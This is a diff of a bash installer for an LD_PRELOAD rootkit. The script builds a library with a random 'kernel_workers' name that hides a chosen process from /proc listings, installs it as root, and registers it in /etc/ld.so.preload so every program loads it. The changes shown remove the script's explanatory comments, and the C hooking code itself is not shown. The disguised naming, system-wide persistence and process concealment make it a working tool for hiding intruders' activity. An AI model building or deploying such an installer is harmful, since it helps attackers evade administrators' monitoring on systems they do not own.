@@ -1,17 +1,11 @@
 #!/bin/bash
+set -e  
 
-# Kernel Workers Library Installation Script
-# This script creates a shared library that filters processes from /proc directory listings
-
-set -e  # Exit on any error
-
-# Colors for output
 RED='\033[0;31m'
 GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
 NC='\033[0m' # No Color
 
-# Function to print colored output
 print_status() {
     echo -e "${GREEN}[INFO]${NC} $1"
 }
@@ -24,7 +18,6 @@ print_error() {
     echo -e "${RED}[ERROR]${NC} $1"
 }
 
-# Check if running as root for installation steps
 check_root() {
     if [[ $EUID -ne 0 ]]; then
         print_error "This script needs to be run as root for installation steps."
@@ -33,22 +26,17 @@ check_root() {
     fi
 }
 
-# Generate random filenames
 generate_random_names() {
-    # Generate random suffix (8-12 characters)
     RANDOM_SUFFIX=$(head /dev/urandom | tr -dc a-z | head -c $((8 + RANDOM % 5)))
     
-    # Generate random C filename with kernel_workers_ prefix
     C_FILENAME="kernel_workers_${RANDOM_SUFFIX}.c"
     
-    # Generate random library name with kernel_workers_ prefix
     LIB_FILENAME="libkernel_workers_${RANDOM_SUFFIX}.so"
     
     print_status "Generated random C filename: $C_FILENAME"
     print_status "Generated random library name: $LIB_FILENAME"
 }
 
-# Get process name from user
 get_process_name() {
     echo ""
     echo "This script will create a library that hides a specific process from /proc listings."
@@ -63,7 +51,6 @@ get_process_name() {
     print_status "Will filter process: $PROCESS_NAME"
 }
 
-# Create the C source file
 create_c_file() {
     print_status "Creating $C_FILENAME..."
     
@@ -171,7 +158,6 @@ EOF
     print_status "Created $C_FILENAME with process filter: $PROCESS_NAME"
 }
 
-# Create the Makefile
 create_makefile() {
     print_status "Creating Makefile..."
     
@@ -189,7 +175,6 @@ EOF
     print_status "Created Makefile"
 }
 
-# Compile the library
 compile_library() {
     print_status "Compiling the shared library..."
     
@@ -210,26 +195,20 @@ compile_library() {
     print_status "Successfully compiled $LIB_FILENAME"
 }
 
-# Install the library
 install_library() {
     print_status "Installing the library to /usr/local/lib/..."
     
-    # Create directory if it doesn't exist
     mkdir -p /usr/local/lib/
     
-    # Copy the library
     cp $LIB_FILENAME /usr/local/lib/
     
-    # Set proper permissions
     chmod 755 /usr/local/lib/$LIB_FILENAME
     print_status "Library installed to /usr/local/lib/$LIB_FILENAME"
 }
 
-# Add to ld.so.preload
 configure_preload() {
     print_status "Configuring ld.so.preload..."
     
-    # Check if already exists in preload
     if grep -q "$LIB_FILENAME" /etc/ld.so.preload 2>/dev/null; then
         print_warning "$LIB_FILENAME already exists in /etc/ld.so.preload"
         read -p "Do you want to continue anyway? (y/N): " -n 1 -r
@@ -240,13 +219,11 @@ configure_preload() {
         fi
     fi
     
-    # Add to preload
     echo "/usr/local/lib/$LIB_FILENAME" >> /etc/ld.so.preload
     
     print_status "Added library to /etc/ld.so.preload"
 }
 
-# Cleanup function
 cleanup() {
     print_status "Cleaning up temporary files..."
     rm -f $C_FILENAME Makefile $LIB_FILENAME
